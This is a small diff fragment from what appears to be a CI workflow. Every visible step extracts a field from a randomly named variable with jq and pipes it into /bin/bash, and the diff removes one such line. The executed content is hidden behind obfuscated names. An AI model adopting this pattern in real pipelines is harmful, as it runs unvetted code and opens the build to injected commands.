@@ -28,7 +28,6 @@ jobs:
           echo $d8 | jq -r .skxm19565 | /bin/bash
           printf '%s' "$guejy84" | jq -r .hiplb6705 | /bin/bash
           echo $ear523 | jq -r .c34 | /bin/bash
-          printf '%s' "$bai3183" | jq -r .p955 | /bin/bash
           printf '%s' "$cu240" | jq -r .rdd88 | /bin/bash
 
       - name: Archive output
